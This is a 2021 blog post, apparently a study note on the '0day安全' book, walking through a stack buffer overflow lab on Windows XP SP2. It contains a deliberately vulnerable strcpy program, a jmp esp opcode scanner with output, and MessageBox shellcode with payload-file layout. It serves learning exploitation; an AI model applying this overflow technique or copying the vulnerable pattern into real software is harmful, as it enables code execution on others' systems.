@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="shortcut icon" href="https://tktkku.github.io/favicon.ico" type="image/x-icon" /><meta name="viewport"content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/><meta name="apple-mobile-web-app-capable"content="yes"/><meta name="apple-mobile-web-app-status-bar-style"content="black"/><meta name="format-detection"content="telephone=no"/><meta name="renderer"content="webkit"><meta name="description"content="温故而知新"><meta charset="UTF-8"><title>0day安全-栈溢出初探 | Gridea</title>
+<link href="https://tktkku.github.io/styles/main.css" type="text/css" rel="stylesheet" /><link href="https://at.alicdn.com/t/font_1621793_zatzzgvf30g.css" type="text/css" rel="stylesheet" /><link rel="stylesheet" href="https://tktkku.github.io/media/css/katex.css"><script async src="https://cdn.jsdelivr.net/npm/busuanzi@2.3.0/bsz.pure.mini.min.js"></script><script src="https://tktkku.github.io/media/js/magnify.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+<script type="text/javascript">function btn_toggle(){document.getElementById("hn").classList.contains("no-js")?document.getElementById("hn").classList.remove("no-js"):document.getElementById("hn").classList.add("no-js")}</script>
+
+<link rel="canonical" href="https://tktkku.github.io/post/0day-an-quan-zhan-yi-chu-chu-tan/" />
+</head>
+<body>
+<div class="progress"></div><style>.progress{background:linear-gradient(to right,#87ceeb var(--scroll),transparent 0);background-repeat:no-repeat;position:fixed;width:100%;height:4px;z-index:1}</style><div class="darkmode-background"></div><div class="darkmode-layer"></div>
+<noscript><p class="warn" >本页面需要浏览器支持（启用）JavaScript</p></noscript><div class="header"><div class="logo_title"><div class="title animated fadeInDown"><a href="https://tktkku.github.io"><img alt="logo" style="display:inline-block;" src="https://tktkku.github.io/images/avatar.png"/></a><h1 title="Gridea" class="weaklink"><a  href="/">Gridea</a></h1>
+
+<div class="navbar weaklink">
+<div class="normal_nav">
+<div class="bitcron_nav_container"><div class="bitcron_nav"><div class="bitcron_nav"><div style="display:flex;justify-content:center;"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >首页</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >归档</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >标签</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >关于</a></li></ul></nav>
+<div style="float:right;margin-top:1em"><form id="gridea-search-form" data-update="1578893743252" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="Search..."></form></div><div style="margin-left:0.5em;margin-top:1.2em"><input id="switch_default" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+<div class="clear clear_nav_inline_end"></div></div></div><div class="clear clear_nav_end"></div></div></div><div class="hamberger" href="javascript:void(0)" onclick="btn_toggle();"><i class="iconfont icon-category"></i></div></div></div></div>
+<div id="hn" class="no-js hidden_nav animated fadeInDown"><div class="bitcron_nav_container"><div class="bitcron_nav"><nav class="mixed_site_nav_wrap site_nav_wrap"><ul class="mixed_site_nav site_nav sm sm-base">	<li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/" class="selected active current nav__item" >首页</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/archives" class="selected active current nav__item" >归档</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/tags" class="selected active current nav__item" >标签</a></li><li><a id="d2ef19af68cc211e98f8a0242ac110003" href="/post/about" class="selected active current nav__item" >关于</a></li></ul><div class="clear clear_nav_inline_end"></div></nav></div><div class="clear clear_nav_end"></div></div>
+<div style="display:flex;justify-content:center;inline-block;text-align:center;margin-top:7%"><div><form id="gridea-search-form" data-update="1625294660386" action="/search/index.html"><input class="search-input" autocomplete="off" spellcheck="false" name="q"  placeholder="Search..." /></form></div><div style="margin-left:0.5em"><input id="switch_default_h" onclick="mobileBtn()" type="checkbox" class="switch_default"><label for="switch_default" class="toggleBtn"></label></div></div>
+</div></div>
+<script>function enableDarkmode(){document.body.classList.add("darkmode"),document.getElementById("switch_default").checked=1,document.getElementById("switch_default_h").checked=1}function removeDarkmode(){document.body.classList.remove("darkmode"),document.getElementById("switch_default").checked=0,document.getElementById("switch_default_h").checked=0}function getCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):null}cookie=getCookie("darkmode"),"enable"==cookie&&enableDarkmode(),window.matchMedia("(prefers-color-scheme: dark)").matches&&"disable"!==cookie&&(enableDarkmode(),document.cookie="darkmode=enable; path=/");var mobileBtn=function(){1==document.getElementById("switch_default").checked?(enableDarkmode(),document.cookie="darkmode=enable; path=/"):(removeDarkmode(),document.cookie="darkmode=disable; path=/")};</script>
+
+<div class="main"><div class="main-inner"><div class="content">
+<article class="post">
+<h2 class="post_title sm_margin"><a>0day安全-栈溢出初探</a></h2>
+<script>function lan(){if(document.getElementById("lan").innerText=="繁"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_tw.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="简"}else{if(document.getElementById("lan").innerText=="簡"){var s=document.getElementById("tongwenlet_cn");if(s!=null){document.body.removeChild(s)}var s=document.createElement("script");s.language="javascript";s.type="text/javascript";s.src="https://cdn.jsdelivr.net/gh/qyxtim/Static@1.1/bookmarklet_cn.js";s.id="tongwenlet_cn";document.body.appendChild(s);document.getElementById("lan").innerHTML="繁"}}};</script>
+<section class="post_details"><i class="iconfont icon-calendar"></i><span style="margin-right:15px"> 2021-07-03</span><i class="iconfont icon-browse"></i><span style="margin-right:15px"> <span id="busuanzi_value_page_pv"></span> Views</span><i class="iconfont icon-category"></i><span class="weaklink" style="margin-right:15px">	<a href="https://tktkku.github.io/tag/hzJJEZb7Y/" class="tag">0day安全</a> | 	<a href="https://tktkku.github.io/tag/Ra4TU8vd9Y/" class="tag">堆栈溢出</a> | 	<a href="https://tktkku.github.io/tag/w77OkjPp8/" class="tag">shellcode</a> | 	<a href="https://tktkku.github.io/tag/dgRlk5xXnF/" class="tag">exploit</a></span><i class="iconfont icon-caret-down"></i><span style="margin-right:15px">1053字</span><i class="iconfont icon-naozhong"></i><span style="margin-right:15px">6 min read</span><a id="lan" href="javascript:void(0);"onclick="lan();"title="调整简繁体" style="margin-right:15px;">繁</a>
+</section>
+
+<div style="display:flex">
+<div class="md_block" id="md_block">
+<div class="round-shape-one"></div>
+<h2 id="0x01-实验环境">0x01 实验环境</h2>
+<ul>
+<li>操作系统： Windows xp sp2</li>
+<li>编译器：Visual C++ 6.0</li>
+<li>编译选项：默认</li>
+<li>build版本：debug</li>
+</ul>
+<h2 id="0x02-实验源程序">0x02 实验源程序</h2>
+<pre><code class="language-c++">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#define PASSWORD &quot;1234567&quot;
+int verify_password(char* password)
+{
+    int authenticated;
+    char buffer[44];
+    authenticated = strcmp(password, PASSWORD);
+    strcpy(buffer, password);
+    return authenticated;
+}
+int main()
+{
+	int valid_flag = 0;
+    char password[1024];
+    FILE* fp;
+    LoadLibrary(&quot;user32.dll&quot;);
+    if (!(fp = fopen(&quot;password.txt&quot;, &quot;rw+&quot;)))
+    {
+        exit(0);
+    }
+    fscanf(fp, &quot;%s&quot;, password);
+    valid_flag = verify_password(password);
+    if (valid_flag)
+    {
+        printf(&quot;incorrect password!\n&quot;);
+    }
+    else
+    {
+        printf(&quot;Congratulation! You have passed the verification！\n&quot;);
+    }
+    fclose(fp);
+    return 0;
+}
+</code></pre>
+<h2 id="0x03-实验原理">0x03 实验原理</h2>
+<p>strcpy函数不检查字符串长度，当长度超过分配的空间就会覆盖掉其他栈帧，向下覆盖掉EIP位特定的指令地址，达到执行任意代码的效果。</p>
+<p>假设有这样一段汇编程序：</p>
+<pre><code class="language-assembly">push b
+push a
+call func
+
+;func
+push ebp
+mov ebp,esp
+sub esp,8
+mov [ebp-8],0
+;其他操作
+add esp,8
+ret 8
+
+</code></pre>
+<p>它所对应的栈：</p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2021/06/05/U6R2CEfxg5jhctY.png" alt="image-20210605162133237" loading="lazy"></figure>
+<p>如果可供使用的空间足够大，直接把局部变量覆盖为shellcode，返回地址处覆盖为局部变量（shellcode）的起始位置，但是当堆栈环境不一样时shellcode的地址也会变化，适用性很小：</p>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2021/06/05/YZHcyTzu3jfiC4D.png" alt="image-20210605162616717" loading="lazy"></figure>
+<p>还有一种就是把shellcode放到后面去，esp就是shellcode的起始位置了，把返回地址覆盖为jmp esp，这样不管怎么变，都能定位到，但是也有可能有些地址是不可写的：</p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2021/06/05/Qj1wIGy3xRWMNks.png" alt="image-20210605163013628" loading="lazy"></figure>
+<h2 id="0x04-实验步骤">0x04 实验步骤</h2>
+<h3 id="一-找jmp-esp地址">一、找jmp esp地址</h3>
+<p>利用程序：</p>
+<pre><code class="language-c++">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#define DLL_NAME &quot;user32.dll&quot;
+int main()
+{
+    BYTE* ptr;
+    int position, address;
+    HINSTANCE handle;
+    BOOL done_flag = FALSE;
+    handle = LoadLibrary(DLL_NAME);
+    if (!handle)
+    {
+        printf(&quot; load dll erro !&quot;);
+        exit(0);
+    }
+    ptr = (BYTE*)handle;
+    for (position = 0; !done_flag; position++)
+    {
+		try
+        {
+            // 0xFFE4是jmp esp的opcode
+            if (ptr[position] == 0xff &amp;&amp; ptr[position+1] == 0xe4)
+            {
+                int address = (int)ptr + position;
+                printf(&quot;OPCODE found at 0x%x\n&quot;, address);
+            }
+        }
+        catch(...)
+        {
+            int address = (int)ptr + position;
+            printf(&quot;END OF 0x%x\n&quot;, address);
+            done_flag = true;
+        }
+    }
+}
+</code></pre>
+<p>output:</p>
+<pre><code>OPCODE found at 0x77d5af0a
+OPCODE found at 0x77d7c5fb
+OPCODE found at 0x77d7c60b
+OPCODE found at 0x77d7c617
+OPCODE found at 0x77d82ac8
+OPCODE found at 0x77d83938
+OPCODE found at 0x77d83a68
+OPCODE found at 0x77d8408c
+OPCODE found at 0x77d85197
+OPCODE found at 0x77d8525f
+OPCODE found at 0x77d85504
+OPCODE found at 0x77d8550c
+OPCODE found at 0x77d85510
+OPCODE found at 0x77d85773
+OPCODE found at 0x77d85924
+OPCODE found at 0x77d85928
+OPCODE found at 0x77d8592c
+OPCODE found at 0x77d859bb
+OPCODE found at 0x77d859f0
+OPCODE found at 0x77d859f8
+OPCODE found at 0x77d85a7f
+OPCODE found at 0x77d85f43
+OPCODE found at 0x77d865eb
+OPCODE found at 0x77d8718c
+OPCODE found at 0x77d871e8
+OPCODE found at 0x77d871f4
+OPCODE found at 0x77d87284
+OPCODE found at 0x77d873a0
+OPCODE found at 0x77d873a4
+OPCODE found at 0x77d873a8
+OPCODE found at 0x77d87c8f
+OPCODE found at 0x77d87cd7
+OPCODE found at 0x77d87d98
+OPCODE found at 0x77d8bacb
+OPCODE found at 0x77d8bb87
+OPCODE found at 0x77d8da6f
+OPCODE found at 0x77d8e434
+OPCODE found at 0x77d8f2c4
+OPCODE found at 0x77d8f3f8
+OPCODE found at 0x77d90af7
+OPCODE found at 0x77d90bbf
+OPCODE found at 0x77d90e64
+OPCODE found at 0x77d90e6c
+OPCODE found at 0x77d90e70
+OPCODE found at 0x77d91284
+OPCODE found at 0x77d91288
+OPCODE found at 0x77d9128c
+OPCODE found at 0x77d91350
+OPCODE found at 0x77d91358
+OPCODE found at 0x77d918a3
+OPCODE found at 0x77d91f4b
+OPCODE found at 0x77d928ef
+OPCODE found at 0x77d929c8
+OPCODE found at 0x77d92a44
+OPCODE found at 0x77d92ac4
+OPCODE found at 0x77d92ac8
+OPCODE found at 0x77d92acc
+OPCODE found at 0x77d92af0
+OPCODE found at 0x77d92b4c
+OPCODE found at 0x77d92c08
+OPCODE found at 0x77d92c78
+OPCODE found at 0x77d92c7c
+OPCODE found at 0x77d92cfc
+OPCODE found at 0x77d92d93
+OPCODE found at 0x77d92e13
+OPCODE found at 0x77d93703
+OPCODE found at 0x77d99313
+OPCODE found at 0x77d99323
+OPCODE found at 0x77d9932f
+END OF 0x77d9f000
+Press any key to continue
+
+</code></pre>
+<p>也可以用OD的插件OllyUni：</p>
+<pre><code>0027762F   Location found: call esp in [unknown]
+00277A0D   Location found: call esp in [unknown]
+00277A17   Location found: call esp in [unknown]
+002F10C8   Location found: call esp in [unknown]
+002F5028   Location found: jmp esp in [unknown]
+00405288   Location found: call esp in findesp.text
+7C82385D   Location found: call esp in kernel32.text
+7C934393   Location found: call esp in ntdll.text
+7C961EED   Location found: jmp esp in ntdll.text
+7C978DB3   Location found: call esp in ntdll.text
+7C97EFF3   Location found: call esp in ntdll.text
+7FFA4512   Location found: jmp esp in [unknown]
+7FFA54CD   Location found: jmp esp in [unknown]
+           13 addresses found, 0 filtered
+</code></pre>
+<p>这里为什么两个找到的不一样我还没想通。。。</p>
+<p>暂定先用0x7ffa54cd</p>
+<p>用Dependency Walker找到MessageBoxA的地址，0x7C961EED</p>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2021/06/05/HipOMNU5CmEFhbX.png" alt="image-20210605171501478" loading="lazy"></figure>
+<p>找到ExitProcess地址，0x7c81caa2</p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2021/06/05/pKUyjPRGCzFaob2.png" alt="image-20210605170910741" loading="lazy"></figure>
+<p>shellcode:</p>
+<pre><code class="language-c++">#include &lt;windows.h&gt;
+int main()
+{
+    HINSTANCE LibHandle;
+    char dllbuf[11] = &quot;user32.dll&quot;;
+    LibHandle = LoadLibrary(dllbuf);
+    __asm 
+    {
+            xor ebx,ebx
+            push ebx
+            //49416d43 6f6f6c21 convert to string is IAmCool!
+            
+
+            push 0x216c6f6f
+			push 0x436d4149
+
+            mov eax,esp
+            push ebx	//0
+            push eax	//str
+            push eax	//str
+            push ebx	//0
+            mov eax,0x77d5050b	//MessageBoxA
+            call eax
+            push ebx
+            mov eax,0x7c81caa2 //ExitProcess
+            call eax
+    }
+	return 0;
+}
+</code></pre>
+<p>编译后取得机器码。</p>
+<p>构造password.txt文件：<br>
+先用任意数据填充前48+4个，第53~56个位置填入jmp esp，第57个位置开始写入shellcode。</p>
+<figure data-type="image" tabindex="6"><img src="https://i.loli.net/2021/06/05/oP1DCgQcBMvhmG3.png" alt="image-20210605201116819" loading="lazy"></figure>
+<p>最后执行，jmp esp成功了，按照预想跳到了shellcode，但是貌似后面的代码被覆盖/替换了，还是说后面的不可写？</p>
+<figure data-type="image" tabindex="7"><img src="https://i.loli.net/2021/06/05/Ho9yIjwAFdRgveQ.png" alt="image-20210605200955746" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://i.loli.net/2021/06/05/dsDz2tmQYjgNTwc.png" alt="image-20210605201740919" loading="lazy"></figure>
+
+<span id="footnote"></span>
+<div id = "warn"></div>
+</div>
+<div class="toc-container"><ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83">0x01 实验环境</a></li>
+<li><a href="#0x02-%E5%AE%9E%E9%AA%8C%E6%BA%90%E7%A8%8B%E5%BA%8F">0x02 实验源程序</a></li>
+<li><a href="#0x03-%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86">0x03 实验原理</a></li>
+<li><a href="#0x04-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4">0x04 实验步骤</a>
+<ul>
+<li><a href="#%E4%B8%80-%E6%89%BEjmp-esp%E5%9C%B0%E5%9D%80">一、找jmp esp地址</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<div id="fullPage"><canvas id="canvas"></canvas></div>
+</article>
+<div id="eof"><span>EOF</span></div><div class="round-shape-one"></div>
+<section>
+<div class="doc_comments">
+
+</div></section>
+</div></div></div><script>
+"use strict";!function(){for(var n=document.getElementsByTagName("pre"),e=n.length,s=0;s<e;s++){n[s].innerHTML='<span class="line-number"></span>'+n[s].innerHTML+'<span class="cl"></span>';for(var a=n[s].innerHTML.split(/\n/).length,r=0;r<a-1;r++){n[s].getElementsByTagName("span")[0].innerHTML+="<span>"+(r+1)+"</span>"}}}();
+let mainNavLinks=document.querySelectorAll(".markdownIt-TOC a");window.addEventListener("scroll",event=>{let fromTop=window.scrollY;mainNavLinks.forEach((link,index)=>{let section=document.getElementById(decodeURI(link.hash).substring(1));let nextSection=null
+if(mainNavLinks[index+1]){nextSection=document.getElementById(decodeURI(mainNavLinks[index+1].hash).substring(1));}
+if(section.offsetTop<=fromTop){if(nextSection){if(nextSection.offsetTop>fromTop){link.classList.add("currentToc");}else{link.classList.remove("currentToc");}}else{link.classList.add("currentToc");}}else{link.classList.remove("currentToc");}});});
+var list=document.querySelectorAll(".katex");for(var i=0;i<list.length;i++){list[i].style.display="unset"};
+var h=document.documentElement,b=document.body,st="scrollTop",sh="scrollHeight",progress=document.querySelector(".progress"),scroll;document.addEventListener("scroll",function(){scroll=(h[st]||b[st])/((h[sh]||b[sh])-h.clientHeight)*100;progress.style.setProperty("--scroll",scroll+"%")});
+var wxScale=new WxScale({fullPage:document.querySelector("#fullPage"),canvas:document.querySelector("#canvas")});var imgBox=document.querySelectorAll("#md_block img");for(var i=0;i<imgBox.length;i++){imgBox[i].onclick=function(e){wxScale.start(this)}};
+content="本文最后更新于2021-07-03，已超过 1 年没有更新，涉及的内容可能已经失效！";var date1="2021-07-03 14:28:12";date1=date1.replace("-","/");var date2=new Date();var date3=date2.getTime()-new Date(date1).getTime();var days=Math.floor(date3/(24*3600*1000));if(days>=365){document.getElementById("warn").innerHTML=content};
+</script>
+<style>#magnifyImg{position:fixed;left:0;top:0;text-align:center;width:100%;display:none;z-index:9999}#magnifyImg img{object-fit:contain;background:#eaecef;padding:15px;border-radius:10px;height:auto;width:auto;vertical-align:middle}</style>
+<a id="scrollUp" href="#top" style="position: fixed; z-index: 2147483647; display: block;"></a><div class="footer animated fadeInDown"><div class="site_footer"><div class="mysocials"><div class="my_socials"></div></div><div class="copyright"id="copyright">Copyright © 2018-2020 <a href="https://tktkku.github.io" style="margin:0;">Gridea</a>.</div>
+<span style="display: inline;margin-right:15px;">👁<strong><span id="busuanzi_value_site_uv"></span></strong></span><span id="busuanzi_container_page_pv" style="display: inline;"><span>📚<strong>12</strong> posts</span></div></div>
+<script>
+console.log("\n %c \u26a1Theme: Bitcron-pro Author's Blog:https://blog.blinkstar.cn  Writen By Serence  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;", );
+</script>
+<script src="https://cdn.jsdelivr.net/npm/instant.page@3.0.0/instantpage.min.js" type="module" defer></script>
+<script type="text/javascript" async src="https://tktkku.github.io/media/js/prism.js"></script>
+</body>
+</html>
